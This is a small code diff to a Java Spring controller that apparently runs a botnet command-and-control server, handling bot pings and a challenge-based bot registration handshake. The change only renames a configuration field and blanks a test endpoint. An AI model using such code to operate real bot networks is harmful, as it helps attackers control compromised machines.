@@ -34,7 +34,7 @@ import cs.sii.service.dao.RoleServiceImpl;
 public class CommandController {
 
 	@Autowired
-	private Config engineBot;
+	private Config configEngine;
 
 	@Autowired
 	private Auth auth;
@@ -50,7 +50,7 @@ public class CommandController {
 	@ResponseBody
 	public String BotPing(HttpServletResponse error) throws IOException {
 		String response = "";
-		if (engineBot.isCommandandconquerStatus()) {
+		if (configEngine.isCommandandconquerStatus()) {
 			response = "ping";
 		} else {
 			error.sendError(HttpStatus.SC_NOT_FOUND);
@@ -79,7 +79,7 @@ public class CommandController {
 	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error) throws IOException {
 		System.out.println("1");
 		Pairs<Long, Integer> response = new Pairs<>();
-		if (engineBot.isCommandandconquerStatus()) {
+		if (configEngine.isCommandandconquerStatus()) {
 			Long keyNumber = new Long(auth.generateNumberText());
 			Integer iterationNumber = new Integer(auth.generateIterationNumber());
 			auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
@@ -106,7 +106,7 @@ public class CommandController {
 		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
 		
 		
-		if (engineBot.isCommandandconquerStatus()) {
+		if (configEngine.isCommandandconquerStatus()) {
 			if (auth.findBotChallengeInfo(idBot)) {
 
 		
@@ -134,7 +134,7 @@ public class CommandController {
 	@ResponseBody
 	public String prova() {
 
-		return engineBot.getIdBot();
+		return "";
 	}
 	
 //	@RequestMapping(value = "/list", method = RequestMethod.GET)
